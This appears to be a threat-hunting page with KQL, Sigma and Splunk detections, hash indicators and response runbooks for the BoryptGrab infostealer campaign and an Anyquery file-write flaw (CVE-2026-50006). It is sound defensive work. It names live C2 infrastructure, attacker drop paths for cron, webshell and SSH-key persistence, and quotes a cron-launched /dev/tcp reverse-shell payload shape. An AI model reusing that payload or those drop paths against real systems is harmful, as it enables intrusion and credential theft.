Actions on Objectives
Detected
Reconnaissance. Attacker researches the target — OSINT, scanning, enumeration.
Weaponization. Coupling exploit code with deliverable payload (e.g. weaponized PDF/Office doc, trojanized installer).
Delivery. Transmitting the weapon (phishing email, USB, watering hole, drive-by, malicious ad). → [LLM] Fake GitHub 'secure download' ZIP fetched from github.io redirector / targetroyena.com
Exploitation. Triggering the exploit — vulnerability/macro/trust abuse to execute code. → [LLM] Remote code injection into chrome.exe to defeat App-Bound Encryption (BoryptGrab) · Article-specific behavioural hunt — Nearly 300 GitHub repos pose as legit software to push malware
Installation. Establishing persistence on the host — backdoor, service, scheduled task, registry key. → [LLM] WinGUP updater (gup.exe / renamed) side-loads libcurl.dll from user-writable ZIP-extraction path · [LLM] Known BoryptGrab / fake-GitHub sample hashes on process, file, or image-load · File hash IOCs — endpoint file/process match
Command & Control. Beacon to attacker infrastructure for control and tasking. → [LLM] BoryptGrab C2 exfil to 193.143.1.131 / targetroyena.com from non-browser process · Beaconing — periodic outbound to small set of destinations · Network connections to article IPs / domains
Actions on Objectives. Lateral movement, credential dumping, data theft, ransomware, sabotage. → Infostealer — non-browser process accessing browser cookie/login DBs
Fake GitHub 'secure download' ZIP fetched from github.io redirector / targetroyena.com AIDelivery Medium
Hunts hosts that reached the campaign's GitHub Pages redirector (bentleyvazquezpvey.github.io) or the BoryptGrab download/C2 domain targetroyena.com / IP 193.143.1.131, which serve the ~1-minute-rotating ZIP archive. Article-specific because it pins the exact delivery infrastructure Arctic Wolf attributed to this fake-repo campaign rather than generic github.io traffic. Rationale: Uses the exact download/C2 domains (targetroyena.com, bentleyvazquezpvey.github.io) and Russia-based C2 IP 193.143.1.131 named in the article's IOC set; these are hard-coded infrastructure, so any hit is high-fidelity delivery/staging evidence. Cross-checked against: • https://arcticwolf.com/resources/blog/fake-github-repositories-deliver-boryptgrab-lineage-infostealer/ • https://www.trendmicro.com/en_us/research/26/c/boryptgrab-stealer-targets-users-via-deceptive-github-pages.html
ATT&CKT1608.006 T1189
Data sourcesNetwork_Traffic.All_Traffic Web.Web
Expected false positives · estimated rate: low — model-assessed, tune to your environment
  • Security researcher or threat-intel analyst deliberately visiting the malicious domain from a sandbox host
  • IOC-scanning/EDR validation tooling replaying indicators against the environment
  • Proxy category-feed prefetch or URL-reputation service resolving the domain
  • A legitimately-named but unrelated github.io page sharing a substring (mitigated by exact host match)
Suppression filter
| where InitiatingProcessFileName !in~ ("MsSense.exe", "SenseIR.exe", "MsMpEng.exe")
Response runbook
Step 1 (triage): Identify the initiating process and user on the hitting host; confirm whether a ZIP was downloaded (check Downloads/Temp) and whether gup.exe or a renamed WinGUP updater executed shortly after. Step 2 (contain): Network-isolate the host, block 193.143.1.131 + targetroyena.com + bentleyvazquezpvey.github.io at proxy/firewall, and force-reset credentials the user held (browser/crypto/Telegram/Discord/Steam). Step 3 (hunt): Pivot on the same IP/domains across all hosts, and search for the WinGUP+libcurl.dll side-load and any large single POST upload to the C2.

WinGUP updater (gup.exe / renamed) side-loads libcurl.dll from user-writable ZIP-extraction path AIInstallation High
Detects the campaign's DLL side-load: a signed WinGUP updater (gup.exe, or renamed per impersonated product) loading a trojanized libcurl.dll from Downloads/Temp/Desktop/Public rather than a legitimate install directory. Article-specific because the legit WinGUP ships libcurl.dll only from its own program-files path, never from a ZIP-extraction folder. Rationale: Anchors on the article's exact side-load pair (WinGUP gup.exe + trojanized libcurl.dll) and the fact that legitimate WinGUP never loads libcurl.dll from a ZIP-extraction/user-writable path — the folder predicate is what separates malicious from benign. Cross-checked against: • https://arcticwolf.com/resources/blog/fake-github-repositories-deliver-boryptgrab-lineage-infostealer/ • https://www.trendmicro.com/en_us/research/26/c/boryptgrab-stealer-targets-users-via-deceptive-github-pages.html
ATT&CKT1574.002 T1204.002
Data sourcesEndpoint.Processes
Expected false positives · estimated rate: low — model-assessed, tune to your environment
  • A developer running a portable app bundle that legitimately ships libcurl.dll next to its exe in Downloads (rare; verify signer/hash)
  • Software-installer staging that extracts libcurl.dll to %TEMP% before moving to Program Files
  • Portable curl/git builds executed from a Desktop folder
  • Malware-analysis/detonation of unrelated samples that carry libcurl.dll
Suppression filter
| where InitiatingProcessFileName !in~ ("msiexec.exe", "setup.exe", "7zFM.exe", "explorer.exe")
Response runbook
Step 1 (triage): Confirm the loading process is a signed WinGUP updater and capture the libcurl.dll SHA256; compare against the article IOC hashes and the legit Notepad++/WinGUP-shipped libcurl.dll. Step 2 (contain): Isolate the host, kill the updater process tree, and quarantine the extracted ZIP + DLL. Step 3 (hunt): Look for reflective in-memory execution, chrome.exe injection, %TEMP% staging folder creation, and outbound traffic to 193.143.1.131/targetroyena.com from the same tree.
DeviceImageLoadEvents
| where Timestamp > ago(30d)
| where FileName =~ "libcurl.dll"
| where FolderPath has_any (@"\Downloads\", @"\Temp\", @"\AppData\Local\Temp\", @"\Desktop\", @"\Public\")
| project Timestamp, DeviceName, InitiatingProcessAccountName, InitiatingProcessFileName, InitiatingProcessFolderPath, InitiatingProcessSHA256, LoadedDll = FileName, DllFolderPath = FolderPath, DllSHA256 = SHA256
| order by Timestamp desc
ImFileEvent
| where TimeGenerated > ago(30d)
| where TargetFileName =~ "libcurl.dll"
| where TargetFilePath has_any (@"\Downloads\", @"\Temp\", @"\Desktop\", @"\Public\")
| project TimeGenerated, DvcHostname, ActorUsername, ActingProcessName, ActingProcessCommandLine, TargetFilePath, TargetFileSHA256
| order by TimeGenerated desc

Known BoryptGrab / fake-GitHub sample hashes on process, file, or image-load AIInstallation Medium
Alerting rule matching the seven Arctic Wolf-published SHA256 hashes for the trojanized libcurl.dll / WinGUP samples across execution, file-write, and DLL-load telemetry. Pure IOC match — deploy immediately as a tripwire for this specific campaign. Rationale: Direct match on the seven article-published SHA256 IOCs across process/file/image-load surfaces; zero interpretation risk, so any hit is a confirmed campaign artifact. Cross-checked against: • https://arcticwolf.com/resources/blog/fake-github-repositories-deliver-boryptgrab-lineage-infostealer/ • https://www.trendmicro.com/en_us/research/26/c/boryptgrab-stealer-targets-users-via-deceptive-github-pages.html
ATT&CKT1574.002 T1620
Data sourcesEndpoint.Processes Endpoint.Filesystem
Expected false positives · estimated rate: low — model-assessed, tune to your environment
  • Deliberate detonation of the sample in an approved malware-analysis sandbox
  • EDR/AV re-scan surfacing the hash from an already-quarantined file
  • Threat-intel platform ingesting the sample for enrichment on an analyst workstation
  • Backup/forensic imaging of a previously-infected host re-reading the file
Response runbook
Step 1 (triage): Confirm the hash hit is a live execution vs. a quarantined/analysis artifact; identify host, user, and originating ZIP. Step 2 (contain): Isolate the host, quarantine all copies of the hash, and reset every credential class the stealer targets (browsers, 32 wallet brands, Telegram/Discord/Steam, Windows Credential Manager). Step 3 (hunt): Sweep the fleet for the same hashes, the WinGUP+libcurl side-load pattern, and C2 contact to 193.143.1.131/targetroyena.com.

Remote code injection into chrome.exe to defeat App-Bound Encryption (BoryptGrab) AIExploitation Medium
Hunts a non-browser process performing remote-thread / APC / context injection into chrome.exe — BoryptGrab's undocumented technique for bypassing Chrome App-Bound Encryption by executing inside the browser process. Article-specific pivot targeting the direct-injection-into-browser behaviour rather than generic LSASS or credential-file reads. Rationale: Targets the article's explicitly-called-out novel behaviour — direct code injection into the Chrome process to bypass App-Bound Encryption — via cross-process injection ActionTypes with a non-browser injector, which no benign app does to chrome.exe. Cross-checked against: • https://arcticwolf.com/resources/blog/fake-github-repositories-deliver-boryptgrab-lineage-infostealer/ • https://www.trendmicro.com/en_us/research/26/c/boryptgrab-stealer-targets-users-via-deceptive-github-pages.html
ATT&CKT1055.002 T1555.003
Data sourcesEndpoint.Processes
Expected false positives · estimated rate: medium — model-assessed, tune to your environment
  • Endpoint security / DLP agents that legitimately inject monitoring shims into browser processes
  • Accessibility or screen-reader tools hooking chrome.exe
  • Browser-automation frameworks (Selenium/Playwright driver) attaching to Chrome
  • Crash-reporting tools reading Chrome memory
Suppression filter
| where Injector !in~ ("MsMpEng.exe", "MsSense.exe", "CSFalconService.exe", "SentinelAgent.exe", "msedgewebview2.exe")
Response runbook
Step 1 (triage): Identify the injector process, its path (Downloads/Temp = strong signal), and SHA256; confirm it is not a sanctioned EDR/DLP/accessibility tool. Step 2 (contain): Isolate the host, terminate the injector and its parent WinGUP updater, and force a full reset of all browser-stored credentials, cookies, and payment data. Step 3 (hunt): Correlate with the libcurl.dll side-load, %TEMP% staging folder, and outbound compressed upload to the campaign C2; sweep for the same injector hash fleet-wide.
DeviceEvents
| where Timestamp > ago(30d)
| where ActionType in ("CreateRemoteThreadApiCall", "QueueUserApcRemoteApiCall", "SetThreadContextRemoteApiCall")
| where FileName =~ "chrome.exe"
| where InitiatingProcessFileName !in~ ("chrome.exe", "msedge.exe", "explorer.exe", "services.exe", "svchost.exe")
| project Timestamp, DeviceName, InitiatingProcessAccountName, Injector = InitiatingProcessFileName, InjectorPath = InitiatingProcessFolderPath, InjectorSHA256 = InitiatingProcessSHA256, TargetProcess = FileName, ActionType
| order by Timestamp desc

BoryptGrab C2 exfil to 193.143.1.131 / targetroyena.com from non-browser process AICommand & Control Medium
Detects the compressed-data exfiltration beacon to the Russia-based C2 (IP 193.143.1.131 / targetroyena.com) initiated by a non-browser process — consistent with BoryptGrab's single-run smash-and-grab that POSTs a ZIP of stolen data. Article-specific because it binds the named C2 endpoint to the stealer's non-browser exfil process. Rationale: Binds the named C2 IP/domain (193.143.1.131, targetroyena.com) to a non-browser initiating process, matching BoryptGrab's single-run compressed exfil; browsers are excluded so a hit is high-fidelity C2/exfil evidence. Cross-checked against: • https://arcticwolf.com/resources/blog/fake-github-repositories-deliver-boryptgrab-lineage-infostealer/ • https://securityaffairs.com/189110/malware/massive-github-malware-operation-spreads-boryptgrab-stealer.html
ATT&CKT1071.001 T1041 T1560.001
Data sourcesNetwork_Traffic.All_Traffic
Expected false positives · estimated rate: low — model-assessed, tune to your environment
  • Analyst or IOC-validation tooling deliberately connecting to the C2 IP/domain
  • Threat-intel scanner/beacon-checker resolving and probing the indicator
  • Shared-hosting IP reuse where a benign service later occupies 193.143.1.131 (verify with domain + timing)
  • Security proxy performing outbound reputation checks
Suppression filter
| where InitiatingProcessFileName !in~ ("MsSense.exe", "SenseIR.exe")
Response runbook
Step 1 (triage): Identify the initiating process, its on-disk path/hash, and the volume of bytes_out (a large single upload strongly corroborates ZIP exfil). Step 2 (contain): Isolate the host, block 193.143.1.131 + targetroyena.com egress, and treat all local credentials/wallets/session tokens as compromised — force rotation. Step 3 (hunt): Walk the process tree back to the WinGUP side-load, inspect %TEMP% for the un-wiped staging folder, and sweep the fleet for any other host touching the C2.
DeviceNetworkEvents
| where Timestamp > ago(30d)
| where RemoteIP == "193.143.1.131" or RemoteUrl has "targetroyena.com"
| where InitiatingProcessFileName !in~ ("chrome.exe", "msedge.exe", "firefox.exe", "brave.exe", "opera.exe")
| project Timestamp, DeviceName, InitiatingProcessAccountName, InitiatingProcessFileName, InitiatingProcessFolderPath, InitiatingProcessSHA256, RemoteIP, RemoteUrl, RemotePort
| order by Timestamp desc
ImNetworkSession
| where TimeGenerated > ago(30d)
| where DstIpAddr == "193.143.1.131" or DstHostname has "targetroyena.com"
| project TimeGenerated, SrcHostname, SrcIpAddr, SrcUsername, DstIpAddr, DstHostname, DstPortNumber, NetworkApplicationProtocol, NetworkBytes
| order by TimeGenerated desc

Beaconing — periodic outbound to small set of destinations Command & Control Medium
C2 channel detection via inter-beacon-time stddev / fan-out to single dest.
ATT&CKT1071.001 T1071.004
Data sourcesNetwork_Traffic.All_Traffic DeviceNetworkEvents
DeviceNetworkEvents
| where Timestamp > ago(1d)
| where RemoteIPType == "Public" and ActionType == "ConnectionSuccess"
| project DeviceName, RemoteIP, RemotePort, Timestamp
| sort by DeviceName asc, RemoteIP asc, RemotePort asc, Timestamp asc
| extend prev_dev = prev(DeviceName, 1), prev_ip = prev(RemoteIP, 1),
         prev_port = prev(RemotePort, 1), prev_ts = prev(Timestamp, 1)
| where DeviceName == prev_dev and RemoteIP == prev_ip and RemotePort == prev_port
| extend delta_sec = datetime_diff('second', Timestamp, prev_ts)
| summarize conn_count = count(), avg_delta = avg(delta_sec), stdev_delta = stdev(delta_sec)
    by DeviceName, RemoteIP, RemotePort
| where conn_count > 30 and avg_delta between (30.0 .. 600.0) and stdev_delta < 5.0
| order by conn_count desc
ImNetworkSession
| where TimeGenerated > ago(2h)
| where DvcAction != "Block"
| where ipv4_is_private(DstIpAddr) == false
| summarize ConnCount = count(),
            DistinctMinutes = dcount(bin(TimeGenerated, 1m))
            by DvcHostname, DstIpAddr, DstPortNumber
| where ConnCount > 50 and DistinctMinutes > 30   // sustained, not bursty
| order by ConnCount desc
NETWORK
Toggle if your env has no CIM data-model acceleration.
| tstats `summariesonly` count, values(All_Traffic.dest_port) AS ports
    from datamodel=Network_Traffic.All_Traffic

    by _time span=10s, All_Traffic.src, All_Traffic.dest

title: Infostealer - Non-Browser Process Accessing Browser Credential Stores
id: 7c8b2e10-4d4f-4a8c-9c1f-bf6e2c4a8d01
status: experimental
description: |
    Stealers (RedLine, Lumma, Vidar, Atomic) read Login Data / cookies
    SQLite databases from Chrome/Edge/Firefox profile directories. Any
    non-browser process touching these files is a high-fidelity signal.
references:
    - https://attack.mitre.org/techniques/T1539/
    - https://attack.mitre.org/techniques/T1555/003/
author: Clankerusecase
date: 2026/05/02
tags:
    - attack.t1539
    - attack.t1555.003
    - attack.credential-access
logsource:
    category: file_access
    product: windows
detection:
    selection_path:
        TargetFilename|contains:
            - '\Google\Chrome\User Data\'
            - '\Microsoft\Edge\User Data\'
            - '\Mozilla\Firefox\Profiles\'
    selection_file:
        TargetFilename|endswith:
            - '\Login Data'
            - '\Cookies'
            - '\logins.json'
            - '\cookies.sqlite'
    filter_browser:
        Image|endswith:
            - '\chrome.exe'
            - '\msedge.exe'
            - '\firefox.exe'
            - '\brave.exe'
            - '\opera.exe'
    condition: selection_path and selection_file and not filter_browser
falsepositives:
    - Backup utilities reading user profile files
    - Browser sync agents from non-stock vendors
level: high
ENDPOINT

    from datamodel=Endpoint.Filesystem
    where (Filesystem.file_path="*\Google\Chrome\User Data\*\Login Data*"
        OR Filesystem.file_path="*\Google\Chrome\User Data\*\Cookies*"
        OR Filesystem.file_path="*\Microsoft\Edge\User Data\*\Login Data*"
        OR Filesystem.file_path="*\Mozilla\Firefox\Profiles\*\logins.json*"
        OR Filesystem.file_path="*\Mozilla\Firefox\Profiles\*\cookies.sqlite*")
      AND NOT Filesystem.process_name IN ("chrome.exe","msedge.exe","firefox.exe","brave.exe","opera.exe")
    by Filesystem.dest, Filesystem.process_name, Filesystem.file_path, Filesystem.user
| `drop_dm_object_name(Filesystem)`
| tstats summariesonly=false count min(_time) as firstTime max(_time) as lastTime
    from datamodel=Endpoint.Filesystem
    where (Filesystem.file_path="*\Google\Chrome\User Data\*\Login Data*"
        OR Filesystem.file_path="*\Google\Chrome\User Data\*\Cookies*"
        OR Filesystem.file_path="*\Microsoft\Edge\User Data\*\Login Data*"
        OR Filesystem.file_path="*\Mozilla\Firefox\Profiles\*\logins.json*"
        OR Filesystem.file_path="*\Mozilla\Firefox\Profiles\*\cookies.sqlite*")
      AND NOT Filesystem.process_name IN ("chrome.exe","msedge.exe","firefox.exe","brave.exe","opera.exe")
    by Filesystem.dest, Filesystem.process_name, Filesystem.file_path, Filesystem.user
| `drop_dm_object_name(Filesystem)`

ATT&CKT1027
Data sourcesEndpoint.Filesystem Endpoint.Processes DeviceFileEvents DeviceProcessEvents
// Pre-filter each table BEFORE the union — the engine cannot push
// predicates across `union`, and DeviceFileEvents lacks ProcessCommandLine
// (Initiating only) so column-projection has to differ per side.
union
    ( DeviceFileEvents
        | where Timestamp > ago(7d)
        | where InitiatingProcessAccountName !endswith "$"
        | where SHA256 in~ ("6db05c4473760c44fa572ffac4c5911b35caf2467a37726c21c5f87e25cb2ea8", "fd01262bd56510088b9ddfe58ca101abb98575f3c0259b480a31b917aa73bc56", "8e1ea6d9a8ccb303be9a2aad3524a529d0d99b1b24a136d8422276e942c4c4b8", "1c854a6aa415f4be964e8a4be49c06e092156bf66d71f9c79995b3e6b156e778", "07dcc12197490bf3292619273ba8b11a960273a34265bca3b7d6d40e8c47dc82", "e9a56961980031a45e578472836576da874512bff50ca3d491fc72e52f7cc7c2", "52825dbf3fc28b9f7c3a24adf78d3425ac714e975769f4d70e8c718ddcbb9856") or SHA1 in~ ("6db05c4473760c44fa572ffac4c5911b35caf2467a37726c21c5f87e25cb2ea8", "fd01262bd56510088b9ddfe58ca101abb98575f3c0259b480a31b917aa73bc56", "8e1ea6d9a8ccb303be9a2aad3524a529d0d99b1b24a136d8422276e942c4c4b8", "1c854a6aa415f4be964e8a4be49c06e092156bf66d71f9c79995b3e6b156e778", "07dcc12197490bf3292619273ba8b11a960273a34265bca3b7d6d40e8c47dc82", "e9a56961980031a45e578472836576da874512bff50ca3d491fc72e52f7cc7c2", "52825dbf3fc28b9f7c3a24adf78d3425ac714e975769f4d70e8c718ddcbb9856") or MD5 in~ ("6db05c4473760c44fa572ffac4c5911b35caf2467a37726c21c5f87e25cb2ea8", "fd01262bd56510088b9ddfe58ca101abb98575f3c0259b480a31b917aa73bc56", "8e1ea6d9a8ccb303be9a2aad3524a529d0d99b1b24a136d8422276e942c4c4b8", "1c854a6aa415f4be964e8a4be49c06e092156bf66d71f9c79995b3e6b156e778", "07dcc12197490bf3292619273ba8b11a960273a34265bca3b7d6d40e8c47dc82", "e9a56961980031a45e578472836576da874512bff50ca3d491fc72e52f7cc7c2", "52825dbf3fc28b9f7c3a24adf78d3425ac714e975769f4d70e8c718ddcbb9856")
        | project Timestamp, DeviceName, ActionType, FileName, FolderPath, SHA256,
                  Cmd = InitiatingProcessCommandLine, Source = "DeviceFileEvents" ),
    ( DeviceProcessEvents
        | where Timestamp > ago(7d)
        | where AccountName !endswith "$"
        | where SHA256 in~ ("6db05c4473760c44fa572ffac4c5911b35caf2467a37726c21c5f87e25cb2ea8", "fd01262bd56510088b9ddfe58ca101abb98575f3c0259b480a31b917aa73bc56", "8e1ea6d9a8ccb303be9a2aad3524a529d0d99b1b24a136d8422276e942c4c4b8", "1c854a6aa415f4be964e8a4be49c06e092156bf66d71f9c79995b3e6b156e778", "07dcc12197490bf3292619273ba8b11a960273a34265bca3b7d6d40e8c47dc82", "e9a56961980031a45e578472836576da874512bff50ca3d491fc72e52f7cc7c2", "52825dbf3fc28b9f7c3a24adf78d3425ac714e975769f4d70e8c718ddcbb9856") or SHA1 in~ ("6db05c4473760c44fa572ffac4c5911b35caf2467a37726c21c5f87e25cb2ea8", "fd01262bd56510088b9ddfe58ca101abb98575f3c0259b480a31b917aa73bc56", "8e1ea6d9a8ccb303be9a2aad3524a529d0d99b1b24a136d8422276e942c4c4b8", "1c854a6aa415f4be964e8a4be49c06e092156bf66d71f9c79995b3e6b156e778", "07dcc12197490bf3292619273ba8b11a960273a34265bca3b7d6d40e8c47dc82", "e9a56961980031a45e578472836576da874512bff50ca3d491fc72e52f7cc7c2", "52825dbf3fc28b9f7c3a24adf78d3425ac714e975769f4d70e8c718ddcbb9856") or MD5 in~ ("6db05c4473760c44fa572ffac4c5911b35caf2467a37726c21c5f87e25cb2ea8", "fd01262bd56510088b9ddfe58ca101abb98575f3c0259b480a31b917aa73bc56", "8e1ea6d9a8ccb303be9a2aad3524a529d0d99b1b24a136d8422276e942c4c4b8", "1c854a6aa415f4be964e8a4be49c06e092156bf66d71f9c79995b3e6b156e778", "07dcc12197490bf3292619273ba8b11a960273a34265bca3b7d6d40e8c47dc82", "e9a56961980031a45e578472836576da874512bff50ca3d491fc72e52f7cc7c2", "52825dbf3fc28b9f7c3a24adf78d3425ac714e975769f4d70e8c718ddcbb9856")
        | project Timestamp, DeviceName, ActionType, FileName, FolderPath, SHA256,
                  Cmd = ProcessCommandLine, Source = "DeviceProcessEvents" )

// Pre-filter both ASIM tables before the union — same pattern as the
// Defender version so the engine can push hash predicates per-side.
let BadHashes = dynamic(["6db05c4473760c44fa572ffac4c5911b35caf2467a37726c21c5f87e25cb2ea8", "fd01262bd56510088b9ddfe58ca101abb98575f3c0259b480a31b917aa73bc56", "8e1ea6d9a8ccb303be9a2aad3524a529d0d99b1b24a136d8422276e942c4c4b8", "1c854a6aa415f4be964e8a4be49c06e092156bf66d71f9c79995b3e6b156e778", "07dcc12197490bf3292619273ba8b11a960273a34265bca3b7d6d40e8c47dc82", "e9a56961980031a45e578472836576da874512bff50ca3d491fc72e52f7cc7c2", "52825dbf3fc28b9f7c3a24adf78d3425ac714e975769f4d70e8c718ddcbb9856"]);
union
    ( ImFileEvent
        | where TimeGenerated > ago(7d)
        | where ActorUsername !endswith "$"
        | where TargetFileSHA256 in~ (BadHashes)
           or TargetFileSHA1 in~ (BadHashes)
           or TargetFileMD5 in~ (BadHashes)
        | project TimeGenerated, DvcHostname, EventType,
                  TargetFileName, TargetFilePath, TargetFileSHA256,
                  Cmd = ActingProcessName, Source = "ImFileEvent" ),
    ( ImProcessCreate
        | where TimeGenerated > ago(7d)
        | where ActorUsername !endswith "$"
        | where SHA256 in~ (BadHashes) or SHA1 in~ (BadHashes) or MD5 in~ (BadHashes)
        | project TimeGenerated, DvcHostname, EventType = TargetProcessName,
                  TargetFileName = TargetProcessName, TargetFilePath = TargetProcessName,
                  TargetFileSHA256 = SHA256,
                  Cmd = TargetProcessCommandLine, Source = "ImProcessCreate" )
| order by TimeGenerated desc

Anyquery process writes to cron/webroot/authorized_keys (CVE-2026-50006 AFW) AIInstallation High
Hunts the arbitrary-file-write primitive in CVE-2026-50006 where an unauthenticated attacker uses ATTACH DATABASE against Anyquery server mode to drop a file into a persistence or code-execution location. Fires when the anyquery process itself creates/modifies a file under cron directories, a web root, or an SSH authorized_keys file — behaviour a SQL-query engine should never exhibit. Rationale: Anchors on the exact AFW targets named in the PoC (/etc/cron.d/pwn, /var/www/html/shell.php, /root/.ssh/authorized_keys) with the writing process constrained to anyquery — a query engine writing cron/webroot/SSH-key files is the article's core primitive and near-zero-FP. Cross-checked against: • https://github.com/advisories/GHSA-xrcf-6jh3-ggvx • https://github.com/julien040/anyquery • https://nvd.nist.gov/vuln/detail/CVE-2025-61679
ATT&CKT1053.003 T1505.003 T1098.004
Data sourcesEndpoint.Filesystem
Expected false positives · estimated rate: low — model-assessed, tune to your environment
  • Anyquery legitimately configured with its SQLite data directory inside a web root and writing .db files there
  • Admin manually invoking anyquery to export a table to a path under /var/www during troubleshooting
  • Anyquery plugin cache or config write if the install path overlaps a monitored directory
  • A backup/deploy job that runs anyquery and touches /home during export
Suppression filter
| where not (FolderPath startswith "/var/www/" and FileName endswith ".db" and InitiatingProcessCommandLine has "export")
Response runbook
1) Triage: pull the full FolderPath/FileName and InitiatingProcessCommandLine; confirm the anyquery process is running in server mode and check version (<0.4.5 is vulnerable). Inspect the written file's contents for cron entries, PHP tags, or SSH public keys. 2) Contain: stop the anyquery server process, remove the dropped file, and restrict the MySQL-compatible port with a host firewall; rotate any exposed root SSH keys. 3) Hunt: pivot on the same host for inbound connections to the anyquery port from external IPs, and for cron/web/sshd execution of the dropped payload (see the reverse-shell UC).
DeviceFileEvents
| where Timestamp > ago(7d)
| where InitiatingProcessFileName =~ "anyquery"
| where ActionType in ("FileCreated","FileModified")
| where (FolderPath has_any ("/etc/cron.d/","/etc/cron.daily/","/etc/cron.hourly/","/var/spool/cron/","/etc/crontab","/var/www/","/usr/share/nginx/html/","/srv/www/")) or (FileName =~ "authorized_keys")
| project Timestamp, DeviceName, InitiatingProcessAccountName, InitiatingProcessCommandLine, FolderPath, FileName, ActionType
| order by Timestamp desc
ImFileEvent
| where TimeGenerated > ago(7d)
| where ActingProcessName has "anyquery"
| where EventType in ("FileCreated","FileModified","FileCreatedModified")
| where (TargetFilePath has_any ("/etc/cron.d/","/etc/cron.daily/","/etc/cron.hourly/","/var/spool/cron/","/etc/crontab","/var/www/","/usr/share/nginx/html/","/srv/www/")) or (TargetFileName =~ "authorized_keys")
| project TimeGenerated, DvcHostname, ActorUsername, ActingProcessCommandLine, TargetFilePath, TargetFileName, EventType
| order by TimeGenerated desc
title: Anyquery Process Writes to Cron/Webroot/AuthorizedKeys (CVE-2026-50006)
id: 6f3b1c2a-8d94-4f7e-9a2b-1c0e5f7a4d21
description: Anyquery server-mode ATTACH DATABASE arbitrary file write to a persistence or RCE location.
references:

Anyquery server bound to all interfaces (unauthenticated exposure, CVE-2026-50006) AIDelivery Medium
Surfaces the misconfiguration that makes CVE-2026-50006 remotely exploitable: an Anyquery instance launched in server mode listening on 0.0.0.0. Because server mode does not authenticate and does not restrict SQLite ATTACH DATABASE, any all-interfaces bind on a version <0.4.5 is a directly reachable AFW/RCE surface. Rationale: Uses the verbatim PoC invocation `anyquery server --host 0.0.0.0 --port 8070` — matching the anyquery binary + `server` subcommand + `0.0.0.0` bind pins the exact exploitable exposure rather than any generic listener. Cross-checked against: • https://github.com/advisories/GHSA-xrcf-6jh3-ggvx • https://github.com/julien040/anyquery
ATT&CKT1190
Data sourcesEndpoint.Processes
Expected false positives · estimated rate: medium — model-assessed, tune to your environment
  • A team intentionally running Anyquery server on 0.0.0.0 behind a trusted network segment or reverse proxy
  • Container/dev environments that bind services to 0.0.0.0 by default
  • An already-patched (>=0.4.5) instance where ATTACH is restricted but the bind string is unchanged
  • Automation/IaC that templates the 0.0.0.0 host flag across many hosts
Response runbook
1) Triage: confirm the anyquery version (patched in 0.4.5) and whether the listening port is reachable from untrusted networks; check for a fronting firewall/proxy. 2) Contain: rebind to 127.0.0.1 or add a host/network ACL on the port, and upgrade to >=0.4.5; if unpatched and internet-facing, take the service offline. 3) Hunt: on any exposed host, correlate with inbound connections to the port and with anyquery file writes to cron/webroot/SSH-key paths (AFW UC) to determine if exploitation already occurred.
DeviceProcessEvents
| where Timestamp > ago(30d)
| where FileName =~ "anyquery"
| where ProcessCommandLine has "server"
| where ProcessCommandLine has "0.0.0.0"
| project Timestamp, DeviceName, AccountName, ProcessCommandLine, FolderPath
| order by Timestamp desc
ImProcessCreate
| where TimeGenerated > ago(30d)
| where ActingProcessName has "anyquery"
| where ActingProcessCommandLine has "server"
| where ActingProcessCommandLine has "0.0.0.0"
| project TimeGenerated, DvcHostname, ActorUsername, ActingProcessCommandLine, ActingProcessName
| order by TimeGenerated desc

Cron-triggered reverse shell via /dev/tcp (CVE-2026-50006 RCE payoff) AICommand & Control High
Detects the execution stage of CVE-2026-50006 where a malicious cronjob written via ATTACH DATABASE fires and spawns a bash /dev/tcp reverse shell. Pins on the cron daemon as parent of a shell whose command line contains the /dev/tcp redirection used in the advisory's PoC payload. Rationale: Uses the advisory's exact cron payload shape (`* * * * * root /bin/bash -c "bash -i >& /dev/tcp/.../1337 0>&1"`): a cron-parented shell with /dev/tcp/ is a high-fidelity bash reverse shell and, tied to the cron parent, maps directly to the CVE's /etc/cron.d drop. Cross-checked against: • https://github.com/advisories/GHSA-xrcf-6jh3-ggvx
ATT&CKT1059.004 T1053.003
Data sourcesEndpoint.Processes
Expected false positives · estimated rate: low — model-assessed, tune to your environment
  • A sysadmin's legitimate cron health-check script that opens a /dev/tcp socket to test port reachability
  • Monitoring agents that use bash /dev/tcp probes from cron
  • Red-team/pentest exercises validating this exact CVE
  • Custom backup scripts piping data over /dev/tcp on a scheduled basis
Suppression filter
| where not (ProcessCommandLine has_any ("healthcheck","port-check","nc -z") and AccountName in~ ("monitoring","nagios"))
Response runbook
1) Triage: capture the full ProcessCommandLine to extract the callback IP/port and the cron file that launched it; inspect /etc/cron.d and /var/spool/cron for a job whose file begins with a binary SQLite header (SQLite format 3). 2) Contain: kill the shell process, block the callback IP egress, remove the malicious cron file, and isolate the host. 3) Hunt: pivot on the callback IP across egress logs, review anyquery file-write and inbound-connection events on the host, and check for secondary persistence (authorized_keys, webshells).
DeviceProcessEvents
| where Timestamp > ago(7d)
| where InitiatingProcessFileName in~ ("cron","crond","CRON")
| where ProcessCommandLine has "/dev/tcp/"
| project Timestamp, DeviceName, AccountName, InitiatingProcessFileName, InitiatingProcessCommandLine, FileName, ProcessCommandLine
| order by Timestamp desc
ImProcessCreate
| where TimeGenerated > ago(7d)
| where ParentProcessName has_any ("cron","crond")
| where ActingProcessCommandLine has "/dev/tcp/"
| project TimeGenerated, DvcHostname, ActorUsername, ParentProcessName, ActingProcessName, ActingProcessCommandLine
| order by TimeGenerated desc

LSASS process access / dump (credential theft) Actions on Objectives High
Mimikatz, comsvcs.dll MiniDump, or any non-Windows process opening LSASS.
ATT&CKT1003.001 T1003
Data sourcesEndpoint.Processes DeviceEvents
DeviceEvents
| where Timestamp > ago(7d)
| where AccountName !endswith "$"
| where ActionType == "OpenProcessApiCall"
| where FileName =~ "lsass.exe"
| where InitiatingProcessFileName !in~ ("MsSense.exe","MsMpEng.exe","csrss.exe",
                                          "svchost.exe","wininit.exe","services.exe",
                                          "lsm.exe","SearchProtocolHost.exe")
| project Timestamp, DeviceName, ActionType, FileName,
          InitiatingProcessFileName, InitiatingProcessCommandLine,
          InitiatingProcessFolderPath, AccountName
| order by Timestamp desc
// SecurityEvent EventID 4663 = object access. AccessMask 0x10 / 0x40 / 0x1010
// indicate read access to lsass.exe — credential-dump signature. Audit
// Object Access > Audit File System policy required.
SecurityEvent
| where TimeGenerated > ago(7d)
| where EventID == 4663
| where ObjectName endswith "\lsass.exe"
| where Account !endswith "$"
| project TimeGenerated, Computer, Account, ObjectName, ProcessName,
          AccessMask, AccessReason
| order by TimeGenerated desc

Coordinated AsyncAPI Supply Chain Attack: Miasma RAT Delivered via Compromised CI/CD Pipelines in Two Repositories

StepSecurity
2026-07-14 14 use cases 4 techniques 6 kill-chain phases detected

